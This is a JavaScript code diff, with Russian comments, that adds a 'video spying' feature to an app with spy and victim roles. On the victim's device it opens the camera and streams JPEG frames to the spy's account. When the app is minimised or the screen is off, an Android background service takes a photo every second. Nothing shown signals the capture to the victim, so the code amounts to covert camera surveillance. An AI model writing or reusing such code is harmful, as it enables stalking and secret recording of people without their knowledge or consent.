@@ -59,6 +59,7 @@
     note = '';
     var sv = { sid: sid, at: now, until: until, shown: target, spy: me() };
     if (snd) { sv.snd = snd; au.start(); }
+    if (G.spy.video) { sv.vid = true; sess.vid = true; sess.cam = ''; sess.camAt = 0; }   // П26 (06, 156): камера жертвы
     Net.set(sess.key, sv);
     P.sound('ok');
     openTab();
@@ -134,6 +135,7 @@
         '<p class="spy-stat">' + (sess.ack ? (sess.mic ? '● СИГНАЛ ЕСТЬ' : '○ МИКРОФОН ИСТОЧНИКА НЕДОСТУПЕН') :
           Net.now() - sess.at > 6000 ? '○ СИГНАЛА НЕТ — источник вне сети' : '… ПОДКЛЮЧЕНИЕ') + '</p>' +
         (sess.snd ? '<div class="spy-snd" id="spy-snd"><span>🔊 ЗВУК · задержка ' + G.spy.soundDelay + ' с</span><div class="spy-vu"><div id="spy-vu"></div></div></div>' : '') +
+        (sess.vid ? '<div class="spy-cam" id="spy-cam"><img id="spy-img" alt=""><p class="spy-cam-st" id="spy-cam-st">' + camText() + '</p></div>' : '') +
         (sess.snd === 'sound' ? '<p class="hint">Звук источника — в динамике или наушниках.</p>' : '<div class="spy-log" id="spy-log">' + logHtml() + '</div>') +
         (G.spy.slider ? '<div id="spy-slider" class="spy-slider"></div>' : '') +
         '<button class="btn dim" id="spy-stop">ОТКЛЮЧИТЬСЯ</button>';
@@ -205,6 +207,7 @@
       return;
     }
     if (b.k === 'spa' && sess && sess.snd && b.sid === sess.sid) { sess.ack = true; au.push(b.d); return; }
+    if (b.k === 'spv' && sess && sess.vid && b.sid === sess.sid) { camFrame(b); return; }
     if (b.k !== 'spy' || !sess || b.sid !== sess.sid) return;
     if (b.ready) { sess.ack = true; sess.mic = b.mic !== false; }
     else if (b.part) sess.part = noisy(b.text || '') || b.text || '';
@@ -242,6 +245,8 @@
     }
     wasCool = cl > 0;
     capSync();
+    vidSync();
+    camWatch();
     victimTick();
   }, 1000);
 
@@ -254,7 +259,7 @@
       var x = k.split(':'), v = st[k];
       if (x[0] !== 'spy' || x[1] !== id || !v || !v.sid) return;
       if (v.until && now > v.until + 5000) return;
-      out.push({ key: k, spy: x[2], sid: v.sid, at: v.at || now, until: v.until || 0, snd: v.snd || '' });
+      out.push({ key: k, spy: x[2], sid: v.sid, at: v.at || now, until: v.until || 0, snd: v.snd || '', vid: !!v.vid });
     });
     return out;
   }
@@ -262,6 +267,7 @@
   function victim() {
     var list = mySessions();
     capSync();
+    vidSync();
     // в APK слушает и отвечает служба; в браузере — страница (проба голоса набирает текст)
     if (!plugin) list.forEach(function (s) {
       if (acked[s.sid]) return;
@@ -356,6 +362,85 @@
     }
   };
   setInterval(function () { au.pump(); }, 100);
+  /* ---------- П26 (06, 156): видео-шпионаж ----------
+     Жертва: приложение на экране — видео со страницы (getUserMedia, ~3 кадра/с, JPEG 320×240); не пошло — в APK
+     снимки делает служба (plugin.camShots), в браузере — «none». Свёрнуто или экран погашен — в APK служба (SgCam,
+     фото раз в 1 с), в браузере — «none». Кадры — живым потоком {k:'spv', sid, src: video / photo / none, d}.
+     Шпион: картинка и строка — «● ВИДЕО», «◐ ФОТО РАЗ В 1 С», «○ КАМЕРА ЦЕЛИ НЕДОСТУПНА». */
+  var vc = { on: false, stream: null, video: null, cv: null, timer: 0, asked: false, noneAt: 0, failAt: 0, starting: false };
+  function vidSessions() { return mySessions().filter(function (s) { return s.vid; }); }
+  function vidSend(src, d) {
+    if (!Net.up) return;
+    vidSessions().forEach(function (s) { var b = { k: 'spv', sid: s.sid, src: src }; if (d) b.d = d; Net.send({ t: 'live', to: ['acc:' + s.spy], body: b }); });
+    P.spvSent = (P.spvSent || 0) + 1;
+  }
+  function vidStop() {
+    clearInterval(vc.timer); vc.timer = 0;
+    if (vc.stream) vc.stream.getTracks().forEach(function (t) { t.stop(); });
+    vc.stream = null; vc.on = false;
+    if (vc.video) { vc.video.srcObject = null; }
+  }
+  function camShots(on) { if (vc.asked === on || !plugin || !plugin.camShots) return; vc.asked = on; plugin.camShots({ on: on }).catch(function () {}); }
+  function vidSync() {
+    var list = vidSessions(), vis = !document.hidden;
+    if (!list.length) { if (vc.on) vidStop(); camShots(false); return; }
+    if (!vis) {   // свёрнуто: в APK снимает служба; в браузере камеры нет
+      if (vc.on) vidStop();
+      camShots(false);
+      if (!plugin && Date.now() - vc.noneAt >= 3000) { vc.noneAt = Date.now(); vidSend('none'); }
+      return;
+    }
+    if (vc.on || vc.starting) return;
+    if (Date.now() - vc.failAt < 10000) { if (!plugin && Date.now() - vc.noneAt >= 3000) { vc.noneAt = Date.now(); vidSend('none'); } return; }
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia || window.SG_NO_CAM) { vidFail(); return; }
+    vc.starting = true;
+    var G = g();
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: G.spy.videoCam === 'back' ? 'environment' : 'user', width: { ideal: 320 }, height: { ideal: 240 } }, audio: false }).then(function (st) {
+      vc.starting = false;
+      if (!vidSessions().length || document.hidden) { st.getTracks().forEach(function (t) { t.stop(); }); return; }
+      camShots(false);
+      vc.stream = st; vc.on = true;
+      if (!vc.video) { vc.video = document.createElement('video'); vc.video.muted = true; vc.video.setAttribute('playsinline', ''); vc.cv = document.createElement('canvas'); vc.cv.width = 320; vc.cv.height = 240; }
+      vc.video.srcObject = st;
+      var pr = vc.video.play(); if (pr && pr.catch) pr.catch(function () {});
+      vc.timer = setInterval(function () {
+        if (!vc.video.videoWidth) return;
+        var c = vc.cv.getContext('2d'), w = vc.video.videoWidth, h = vc.video.videoHeight, k = Math.min(320 / w, 240 / h);
+        c.fillStyle = '#000'; c.fillRect(0, 0, 320, 240);
+        c.drawImage(vc.video, (320 - w * k) / 2, (240 - h * k) / 2, w * k, h * k);
+        vidSend('video', vc.cv.toDataURL('image/jpeg', 0.5).split(',')[1]);
+      }, 333);
+    }).catch(function () { vc.starting = false; vidFail(); });
+  }
+  function vidFail() {   // видео не пошло: в APK — снимки службой, в браузере — «камера недоступна»
+    vc.failAt = Date.now();
+    if (plugin && plugin.camShots) camShots(true);
+    else { vc.noneAt = Date.now(); vidSend('none'); }
+  }
+  document.addEventListener('visibilitychange', function () { vidSync(); });
+  /* шпион */
+  function camText() {
+    var s = sess;
+    if (!s || !s.vid) return '';
+    return s.cam === 'video' ? '● ВИДЕО' : s.cam === 'photo' ? '◐ ФОТО РАЗ В 1 С' : s.cam === 'none' ? '○ КАМЕРА ЦЕЛИ НЕДОСТУПНА' : s.cam === 'lost' ? '○ НЕТ КАДРОВ' : '… КАМЕРА';
+  }
+  function camFrame(b) {
+    var s = sess;
+    s.cam = b.src === 'video' || b.src === 'photo' ? b.src : 'none';
+    if (b.d) { s.camAt = Date.now(); s.frames = (s.frames || 0) + 1; var im = $('spy-img'); if (im) im.src = 'data:image/jpeg;base64,' + b.d; }
+    camPaint();
+  }
+  function camPaint() {
+    var st = $('spy-cam-st'), box = $('spy-cam');
+    if (st) st.textContent = camText();
+    if (box) { box.classList.toggle('none', sess.cam === 'none' || sess.cam === 'lost'); box.classList.toggle('nz', !!(spySl && !spySl.inBand())); }
+  }
+  function camWatch() {   // кадры перестали приходить
+    if (!sess || !sess.vid) return;
+    if ((sess.cam === 'video' || sess.cam === 'photo') && Date.now() - sess.camAt > 4000) sess.cam = 'lost';
+    camPaint();
+  }
+  P.spyCamStat = function () { return sess && sess.vid ? { cam: sess.cam, frames: sess.frames || 0, text: camText() } : null; };
   P.spySndStat = function () { return { got: au.got, played: au.played, level: au.level, queued: au.q.length, sent: P.spaSent || 0 }; };
   P.spySessions = mySessions;
 
